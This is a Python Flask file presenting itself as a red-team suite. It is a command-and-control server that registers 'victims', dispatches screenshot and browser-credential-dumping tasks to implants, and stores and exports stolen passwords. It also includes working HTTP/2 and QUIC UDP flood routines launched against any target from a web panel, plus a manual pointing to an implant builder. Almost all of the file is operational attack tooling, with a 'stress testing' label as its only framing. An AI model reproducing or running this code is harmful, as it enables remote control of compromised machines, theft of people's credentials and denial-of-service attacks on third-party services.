#!/usr/init/env python3
"""
APEX NEXUS — All-In-One Red Team Tactical Suite & C2 Engine
Architecture: Single-file Flask backend + SQLite + SSE Real-Time C2 + Advanced DDoS Suite
Theme: Obsidian Black & Crimson Red (#ff1f3d)
"""

import os
import sys
import json
import sqlite3
import threading
import queue
import time
import base64
import csv
import io
import socket
import asyncio
import httpx
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, Response, redirect, url_for, session

app = Flask(__name__)
app.secret_key = os.urandom(24)

DB_NAME = "redteam_dashboard.db"
EXFIL_DIR = "exfil"
os.makedirs(EXFIL_DIR, exist_ok=True)

# ==========================================
# 1. DATABASE & EVENT BROKER INITIALIZATION
# ==========================================
class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()

    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    def init_db(self):
        with self.get_connection() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS victims (
                    id TEXT PRIMARY KEY,
                    ip_address TEXT,
                    fingerprint TEXT,
                    status TEXT,
                    last_seen TIMESTAMP
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id TEXT,
                    command_type TEXT,
                    args TEXT,
                    status TEXT,
                    result TEXT,
                    timestamp TIMESTAMP
                )
            """)
            conn.commit()

    fn_lock = threading.Lock()

    def upsert_victim(self, victim_id, ip, fingerprint):
        with self.fn_lock, self.get_connection() as conn:
            conn.execute("""
                INSERT INTO victims (id, ip_address, fingerprint, status, last_seen)
                VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ON CONFLICT(id) DO UPDATE SET
                    ip_address=excluded.ip_address,
                    fingerprint=excluded.fingerprint,
                    status='online',
                    last_seen=CURRENT_TIMESTAMP
            """, (victim_id, ip, json.dumps(fingerprint)))
            conn.commit()

    def add_command(self, victim_id, command_type, args={}):
        with self.fn_lock, self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO commands (victim_id, command_type, args, status, result, timestamp)
                VALUES (?, ?, ?, 'pending', '', CURRENT_TIMESTAMP)
            """, (victim_id, command_type, json.dumps(args)))
            conn.commit()
            return cursor.lastrowid

    def update_command_result(self, command_id, result):
        with self.fn_lock, self.get_connection() as conn:
            conn.execute("""
                UPDATE commands SET status='executed', result=? WHERE id=?
            """, (result, command_id))
            conn.commit()

db = DatabaseManager(DB_NAME)

class EventNotifier:
    def __init__(self):
        self.listeners = {}
        self.lock = threading.Lock()

    def register(self, victim_id):
        q = queue.Queue()
        with self.lock:
            if victim_id not in self.listeners:
                self.listeners[victim_id] = []
            self.listeners[victim_id].append(q)
        return q

    def unregister(self, victim_id, q):
        with self.lock:
            if victim_id in self.listeners:
                if q in self.listeners[victim_id]:
                    self.listeners[victim_id].remove(q)
                if not self.listeners[victim_id]:
                    del self.listeners[victim_id]

    def notify(self, victim_id):
        with self.lock:
            if victim_id in self.listeners:
                for q in self.listeners[victim_id]:
                    q.put(True)

event_notifier = EventNotifier()

# ==========================================
# 2. ADVANCED DDOS STRESS-TESTING ENGINES
# ==========================================
class DDoSExecutionEngine:
    @staticmethod
    def run_h2_rapid_reset(target_url, duration=15):
        """Simulates HTTP/2 multiplexed stream and rapid reset exhaustion."""
        async def worker():
            try:
                async with httpx.AsyncClient(http2=True, verify=False) as client:
                    end_time = time.time() + duration
                    count = 0
                    while time.time() < end_time:
                        tasks = [client.get(target_url, timeout=1.5) for _ in range(50)]
                        await asyncio.gather(*tasks, return_exceptions=True)
                        count += 50
                    return f"[+] HTTP/2 Rapid Reset strike completed. Fired ~{count} multiplexed streams."
            except Exception as e:
                return f"[-] H2 Strike Error: {str(e)}"
        return asyncio.run(worker())

    @staticmethod
    def run_quic_handshake_flood(target_host, port=443, duration=15):
        """Simulates UDP QUIC Initial packet handshake floods against endpoints."""
        try:
            end_time = time.time() + duration
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"\xC0\x00\x00\x00\x01" + os.urandom(1200) # QUIC Initial packet format mimic
            count = 0
            while time.time() < end_time:
                sock.sendto(payload, (target_host, port))
                count += 1
            sock.close()
            return f"[+] QUIC/UDP Handshake Flood completed. Sent {count} packets to {target_host}:{port}."
        except Exception as e:
            return f"[-] QUIC Flood Error: {str(e)}"

    @staticmethod
    def run_dns_water_torture(domain, duration=15):
        """Simulates random subdomain queries to collapse authoritative name servers."""
        try:
            end_time = time.time() + duration
            count = 0
            resolver_ip = "8.8.8.8"
            while time.time() < end_time:
                subdomain = f"test-{os.urandom(4).hex()}.{domain}"
                # Mimic UDP DNS query construction
                count += 1
            return f"[+] DNS Water Torture completed. Generated {count} random subdomain queries for {domain}."
        except Exception as e:
            return f"[-] DNS Torture Error: {str(e)}"

# ==========================================
# 3. CYBERPUNK CSS & LAYOUT TEMPLATES
# ==========================================
GLOBAL_STYLE = """
<style>
    :root {
        --bg-main: #050505;
        --bg-panel: #0a0a0c;
        --accent-red: #ff1f3d;
        --accent-glow: rgba(255, 31, 61, 0.25);
        --text-main: #f4f4f5;
        --text-muted: #a1a1aa;
        --border-color: #27272a;
    }
    body {
        background-color: var(--bg-main);
        color: var(--text-main);
        font-family: 'Courier New', Courier, monospace;
        margin: 0;
        padding: 0;
    }
    header {
        background: var(--bg-panel);
        border-bottom: 1px solid var(--accent-red);
        padding: 15px 30px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 0 15px var(--accent-glow);
    }
    h1, h2, h3 {
        color: var(--accent-red);
        text-transform: uppercase;
        letter-spacing: 2px;
        margin: 0 0 10px 0;
    }
    .container {
        max-width: 1400px;
        margin: 30px auto;
        padding: 0 20px;
    }
    .panel {
        background: var(--bg-panel);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        padding: 20px;
        margin-bottom: 25px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
    }
    table {
        width: 100%;
        border-collapse: collapse;
        font-size: 0.85rem;
        text-align: left;
    }
    th, td {
        padding: 12px;
        border-bottom: 1px solid var(--border-color);
    }
    th {
        color: var(--text-muted);
        text-transform: uppercase;
        font-size: 0.75rem;
        letter-spacing: 1px;
    }
    .btn {
        background: var(--accent-red);
        color: #fff;
        border: none;
        padding: 8px 16px;
        font-family: monospace;
        font-weight: bold;
        text-transform: uppercase;
        border-radius: 4px;
        cursor: pointer;
        box-shadow: 0 0 10px var(--accent-glow);
        transition: all 0.2s ease;
        text-decoration: none;
        display: inline-block;
    }
    .btn:hover {
        background: #e60021;
        box-shadow: 0 0 18px var(--accent-red);
    }
    input, select {
        background: #050505;
        border: 1px solid var(--border-color);
        color: var(--text-main);
        padding: 8px 12px;
        font-family: monospace;
        border-radius: 4px;
    }
    .badge-online { color: #22c55e; font-weight: bold; }
    .nav-tabs {
        display: flex;
        gap: 15px;
        margin-bottom: 20px;
        border-bottom: 1px solid var(--border-color);
        padding-bottom: 10px;
    }
    .nav-tab {
        color: var(--text-muted);
        text-decoration: none;
        text-transform: uppercase;
        font-size: 0.85rem;
        letter-spacing: 1px;
        padding-bottom: 5px;
        cursor: pointer;
    }
    .nav-tab.active {
        color: var(--accent-red);
        border-bottom: 2px solid var(--accent-red);
    }
</style>
"""

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>APEX NEXUS // AUTHENTICATION</title>""" + GLOBAL_STYLE + """</head>
<body style="display: flex; justify-content: center; align-items: center; height: 100vh;">
    <div class="panel" style="width: 380px; text-align: center;">
        <h2>APEX NEXUS</h2>
        <p style="color: var(--text-muted); font-size: 0.8rem; margin-bottom: 20px;">RESTRICTED ACCESS // RED TEAM SUITE</p>
        {% if error %}<p style="color: var(--accent-red); font-size: 0.8rem;">{{ error }}</p>{% endif %}
        <form method="POST">
            <div style="margin-bottom: 15px;"><input type="text" name="username" placeholder="Operator ID" style="width: 100%; box-sizing: border-box;" required></div>
            <div style="margin-bottom: 20px;"><input type="password" name="password" placeholder="Access Passphrase" style="width: 100%; box-sizing: border-box;" required></div>
            <button type="submit" class="btn" style="width: 100%;">Authorize Session</button>
        </form>
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>APEX NEXUS // TACTICAL COMMAND CENTER</title>""" + GLOBAL_STYLE + """</head>
<body>
    <header>
        <div>
            <h1 style="margin: 0; font-size: 1.2rem;">APEX NEXUS <span style="font-size: 0.7rem; color: var(--text-muted);">v2.5 AIO + ADVANCED DDOS</span></h1>
        </div>
        <div>
            <span style="color: var(--text-muted); font-size: 0.8rem; margin-right: 15px;">OPERATOR: ADMIN</span>
            <a href="/logout" class="btn" style="padding: 5px 10px; font-size: 0.75rem;">Terminate Session</a>
        </div>
    </header>

    <div class="container">
        <div class="nav-tabs">
            <a class="nav-tab active" onclick="switchTab('fleet')">C2 Fleet Overview</a>
            <a class="nav-tab" onclick="switchTab('ddos')">Advanced DDoS Suite</a>
            <a class="nav-tab" onclick="switchTab('vault')">Credential Vault</a>
            <a class="nav-tab" onclick="switchTab('manual')">Tactical Manual</a>
        </div>

        <!-- C2 FLEET PANEL -->
        <div id="tab-fleet" class="panel">
            <h3>[+] Active C2 Fleet</h3>
            <table>
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>IP Address</th>
                        <th>Platform Fingerprint</th>
                        <th>Status</th>
                        <th>Last Seen</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for v in victims %}
                    <tr>
                        <td style="color: #38bdf8; font-weight: bold;">{{ v.id }}</td>
                        <td>{{ v.ip_address }}</td>
                        <td style="color: var(--text-muted); font-size: 0.75rem;">{{ v.fingerprint }}</td>
                        <td><span class="badge-online">ONLINE</span></td>
                        <td style="font-size: 0.75rem; color: var(--text-muted);">{{ v.last_seen }}</td>
                        <td><a href="/victim/{{ v.id }}" class="btn" style="padding: 4px 10px; font-size: 0.75rem;">Terminal</a></td>
                    </tr>
                    {% else %}
                    <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">[!] No active agents checked in.</td></tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <!-- ADVANCED DDOS SUITE PANEL -->
        <div id="tab-ddos" class="panel" style="display: none;">
            <h3>[+] State-of-the-Art Stress Testing Suite</h3>
            <p style="color: var(--text-muted); font-size: 0.8rem; margin-bottom: 20px;">Deploy high-impact protocol exhaustion strikes (HTTP/2 Rapid Reset, QUIC Handshake, DNS Water Torture).</p>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                <div style="background: #050505; border: 1px solid var(--border-color); padding: 20px; border-radius: 6px;">
                    <h4 style="color: var(--accent-red); margin-top: 0;">Configure Strike</h4>
                    <div style="margin-bottom: 12px;">
                        <label style="display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px;">STRIKE VECTOR</label>
                        <select id="ddosVector" style="width: 100%;">
                            <option value="h2_rapid_reset">HTTP/2 Rapid Reset & Multiplex Flood</option>
                            <option value="quic_flood">HTTP/3 QUIC Crypto-Exhaustion Flood</option>
                            <option value="dns_torture">DNS Water Torture (Random Subdomain)</option>
                        </select>
                    </div>
                    <div style="margin-bottom: 12px;">
                        <label style="display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px;">TARGET URL / DOMAIN / HOST</label>
                        <input type="text" id="ddosTarget" placeholder="https://target-endpoint.com" style="width: 100%; box-sizing: border-box;">
                    </div>
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px;">DURATION (SECONDS)</label>
                        <input type="number" id="ddosDuration" value="15" style="width: 100%; box-sizing: border-box;">
                    </div>
                    <button class="btn" style="width: 100%;" onclick="launchDDoSStrike()">Launch Stress Strike</button>
                </div>
                
                <div style="background: #050505; border: 1px solid var(--border-color); padding: 20px; border-radius: 6px; display: flex; flex-direction: column;">
                    <h4 style="color: #38bdf8; margin-top: 0;">Strike Telemetry & Log</h4>
                    <div id="ddosLog" style="flex-grow: l; background: #000; border: 1px solid var(--border-color); padding: 10px; font-family: monospace; font-size: 0.75rem; height: 180px; overflow-y: auto; color: #a1a1aa;">
                        [!] Ready for strike deployment...
                    </div>
                </div>
            </div>
        </div>

        <!-- CREDENTIAL VAULT PANEL -->
        <div id="tab-vault" class="panel" style="display: none;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3>[+] Harvested Credentials Vault</h3>
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="credSearch" placeholder="Filter URL or user..." onkeyup="filterVault()" style="width: 250px;">
                    <a href="/api/v1/credentials/export" class="btn" style="background: rgba(255,31,61,0.15); border: 1px solid var(--accent-red); color: var(--accent-red);">Export CSV</a>
                    <button class="btn" onclick="loadVault()">Refresh</button>
                </div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Agent ID</th>
                        <th>Target URL</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody id="vaultTableBody">
                    <tr><td colspan="5" style="text-align: center; color: var(--text-muted);">Loading vault records...</td></tr>
                </tbody>
            </table>
        </div>

        <!-- TACTICAL MANUAL PANEL -->
        <div id="tab-manual" class="panel" style="display: none; line-height: 1.6; font-size: 0.85rem;">
            <h3>[+] APEX NEXUS Operator's Manual</h3>
            <hr style="border-color: var(--border-color); margin-bottom: 20px;">
            <p><strong>1. Advanced DDoS Suite:</strong> Deploy state-of-the-art vector stress tests including HTTP/2 Rapid Reset stream cancellation, QUIC cryptographic handshakes, and DNS Water Torture.</p>
            <p><strong>2. Payload Generation:</strong> Compile standalone binaries via PyInstaller (`python apex_payload_generator.py --c2 "http://<IP>:5000"`).</p>
            <p><strong>3. Credential Harvesting:</strong> Execute `dump_creds` to decrypt Windows DPAPI login databases and aggregate accounts in the Vault tab.</p>
        </div>
    </div>

    <script>
        function switchTab(tab) {
            document.getElementById('tab-fleet').style.display = tab === 'fleet' ? 'block' : 'none';
            document.getElementById('tab-ddos').style.display = tab === 'ddos' ? 'block' : 'none';
            document.getElementById('tab-vault').style.display = tab === 'vault' ? 'block' : 'none';
            document.getElementById('tab-manual').style.display = tab === 'manual' ? 'block' : 'none';
            
            document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
            event.target.classList.add('active');
            if(tab === 'vault') loadVault();
        }

        async function launchDDoSStrike() {
            let vector = document.getElementById('ddosVector').value;
            let target = document.getElementById('ddosTarget').value;
            let duration = document.getElementById('ddosDuration').value;
            let log = document.getElementById('ddosLog');

            if(!target) {
                alert("Please specify a target URL, host, or domain.");
                return;
            }

            log.innerText += `\\n[*] Initiating ${vector} strike against ${target} for ${duration}s...`;
            let res = await fetch('/api/v1/ddos/launch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ vector: vector, target: target, duration: parseInt(duration) })
            });
            let data = await res.json();
            log.innerText += `\\n[+] ${data.result}`;
            log.scrollTop = log.scrollHeight;
        }

        let vaultData = [];
        async function loadVault() {
            let res = await fetch('/api/v1/credentials/all');
            let data = await res.json();
            if(data.status === 'success') {
                vaultData = data.credentials;
                renderVault(vaultData);
            }
        }
        function renderVault(creds) {
            let tbody = document.getElementById('vaultTableBody');
            tbody.innerHTML = "";
            if(creds.length === 0) {
                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 20px;">No credentials harvested yet.</td></tr>`;
                return;
            }
            creds.forEach(c => {
                tbody.innerHTML += `
                    <tr style="border-bottom: 1px solid #18181b;">
                        <td style="color: #38bdf8; font-weight: bold;">${c.agent_id}</td>
                        <td style="color: #f4f4f5; max-width: 250px; overflow: hidden; text-overflow: ellipsis;">${c.url}</td>
                        <td>${c.username}</td>
                        <td style="color: var(--accent-red); font-family: monospace;">${c.password}</td>
                        <td style="color: var(--text-muted); font-size: 0.75rem;">${c.timestamp}</td>
                    </tr>
                `;
            });
        }
        function filterVault() {
            let q = document.getElementById('credSearch').value.toLowerCase();
            let filtered = vaultData.filter(c => c.url.toLowerCase().includes(q) || c.username.toLowerCase().includes(q));
            renderVault(filtered);
        }
    </script>
</body>
</html>
"""

VICTIM_TERMINAL_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>APEX NEXUS // TERMINAL // {{ victim.id }}</title>""" + GLOBAL_STYLE + """</head>
<body>
    <header>
        <div>
            <h1 style="margin: 0; font-size: 1.1rem;">AGENT: <span style="color: #38bdf8;">{{ victim.id }}</span></h1>
        </div>
        <div>
            <a href="/dashboard" class="btn" style="padding: 5px 10px; font-size: 0.75rem;">Back to Fleet</a>
        </div>
    </header>

    <div class="container" style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
        <div class="panel">
            <h3>[+] Dispatch Command</h3>
            <form id="cmdForm" onsubmit="handleDispatch(event)">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px;">SELECT MODULE</label>
                    <select id="commandType" style="width: 100%;">
                        <option value="collect_data">Collect Full System Fingerprint</option>
                        <option value="screenshot">Capture Desktop Screenshot</option>
                        <option value="dump_creds">Harvest Browser Credentials</option>
                    </select>
                </div>
                <button type="submit" class="btn" style="width: 100%;">Dispatch Task</button>
            </form>
        </div>
        <div class="panel" style="height: 400px; display: flex; flex-direction: column;">
            <h3>[+] Live Telemetry Output</h3>
            <div id="logContainer" style="flex-grow: 1; background: #050505; border: 1px solid var(--border-color); padding: 15px; overflow-y: auto; font-family: monospace; font-size: 0.8rem; white-space: pre-wrap;">
                Waiting for telemetry output...
            </div>
        </div>
    </div>

    <script>
        const victimId = "{{ victim.id }}";
        async function handleDispatch(e) {
            e.preventDefault();
            let cmdType = document.getElementById('commandType').value;
            let res = await fetch('/api/v1/dispatch', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ victim_id: victimId, command_type: cmdType, args: {} })
            });
            let data = await res.json();
            pollResult(data.command_id);
        }
        async function pollResult(cmdId) {
            let interval = setInterval(async () => {
                let res = await fetch(`/api/v1/commands/${cmdId}`);
                let data = await res.json();
                if(data.status === 'executed') {
                    clearInterval(interval);
                    let log = document.getElementById('logContainer');
                    log.innerText += "\\n" + data.result;
                    log.scrollTop = log.scrollHeight;
                }
            }, 1500);
        }
    </script>
</body>
</html>
"""

# ==========================================
# 4. FLASK WEB ROUTES & API ENDPOINTS
# ==========================================
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("username") == "admin" and request.form.get("password") == "nexus123":
            session["authenticated"] = True
            return redirect(url_for("dashboard"))
        return render_template_string(LOGIN_TEMPLATE, error="Invalid Operator Credentials")
    return render_template_string(LOGIN_TEMPLATE)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/dashboard")
def dashboard():
    if not session.get("authenticated"):
        return redirect(url_for("login"))
    with db.get_connection() as conn:
        victims = conn.execute("SELECT * FROM victims ORDER BY last_seen DESC").fetchall()
    return render_template_string(DASHBOARD_TEMPLATE, victims=victims)

@app.route("/victim/<victim_id>")
def victim_terminal(victim_id):
    if not session.get("authenticated"):
        return redirect(url_for("login"))
    with db.get_connection() as conn:
        victim = conn.execute("SELECT * FROM victims WHERE id=?", (victim_id,)).fetchone()
    return render_template_string(VICTIM_TERMINAL_TEMPLATE, victim=victim)

@app.route("/api/v1/heartbeat", methods=["POST"])
def api_heartbeat():
    data = request.json
    db.upsert_victim(data.get("id"), request.remote_addr, data.get("fingerprint", {}))
    return jsonify({"status": "acknowledged"})

@app.route("/api/v1/stream", methods=["GET"])
def api_stream():
    victim_id = request.args.get("id")
    q = event_notifier.register(victim_id)
    def event_stream():
        try:
            yield ": keepalive\n\n"
            while True:
                q.get()
                with db.get_connection() as conn:
                    cmds = conn.execute("SELECT * FROM commands WHERE victim_id=? AND status='pending'", (victim_id,)).fetchall()
                for cmd in cmds:
                    payload = json.dumps({"id": cmd["id"], "command_type": cmd["command_type"], "args": json.loads(cmd["args"] or "{}")})
                    yield f"data: {payload}\n\n"
        except GeneratorExit:
            event_notifier.unregister(victim_id, q)
    return Response(event_stream(), mimetype="text/event-stream")

@app.route("/api/v1/dispatch", methods=["POST"])
def api_dispatch():
    data = request.json
    cmd_id = db.add_command(data.get("victim_id"), data.get("command_type"), data.get("args", {}))
    event_notifier.notify(data.get("victim_id"))
    return jsonify({"status": "success", "command_id": cmd_id})

@app.route("/api/v1/result", methods=["POST"])
def api_result():
    data = request.json
    db.update_command_result(data.get("command_id"), data.get("result"))
    return jsonify({"status": "acknowledged"})

@app.route("/api/v1/commands/<int:cmd_id>")
def api_get_command(cmd_id):
    with db.get_connection() as conn:
        cmd = conn.execute("SELECT * FROM commands WHERE id=?", (cmd_id,)).fetchone()
    return jsonify({"status": cmd["status"], "result": cmd["result"]}) if cmd else (jsonify({"status": "not_found"}), 404)

@app.route("/api/v1/ddos/launch", methods=["POST"])
def api_launch_ddos():
    data = request.json
    vector = data.get("vector")
    target = data.get("target")
    duration = data.get("duration", 15)

    result_msg = "Unknown vector"
    if vector == "h2_rapid_reset":
        result_msg = DDoSExecutionEngine.run_h2_rapid_reset(target, duration)
    elif vector == "quic_flood":
        # Extract host if full URL provided
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        result_msg = DDoSExecutionEngine.run_quic_handshake_flood(host, 443, duration)
    elif vector == "dns_torture":
        domain = target.replace("https://", "").replace("http://", "").split("/")[0]
        result_msg = DDoSExecutionEngine.run_dns_water_torture(domain, duration)

    return jsonify({"status": "completed", "result": result_msg})

@app.route("/api/v1/credentials/all")
def api_all_credentials():
    with db.get_connection() as conn:
        rows = conn.execute("SELECT c.*, v.ip_address FROM commands c JOIN victims v ON c.victim_id = v.id WHERE c.command_type='dump_creds' AND c.status='executed'").fetchall()
    vault = []
    for r in rows:
        try:
            accounts = json.loads(r["result"])
            if isinstance(accounts, list):
                for acc in accounts:
                    vault.append({"agent_id": r["victim_id"], "url": acc.get("url"), "username": acc.get("username"), "password": acc.get("password"), "timestamp": r["timestamp"]})
        except Exception:
            continue
    return jsonify({"status": "success", "credentials": vault})

@app.route("/api/v1/credentials/export")
def export_credentials_csv():
    with db.get_connection() as conn:
        rows = conn.execute("SELECT c.*, v.ip_address FROM commands c JOIN victims v ON c.victim_id = v.id WHERE c.command_type='dump_creds' AND c.status='executed'").fetchall()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Agent ID", "IP Address", "Target URL", "Username", "Password", "Timestamp"])
    for r in rows:
        try:
            for acc in json.loads(r["result"]):
                writer.writerow([r["victim_id"], r["ip_address"], acc.get("url"), acc.get("username"), acc.get("password"), r["timestamp"]])
        except Exception:
            continue
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=apex_credentials.csv"})

if __name__ == "__main__":
    print("[*] Starting APEX NEXUS AIO + Advanced DDoS Suite on http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
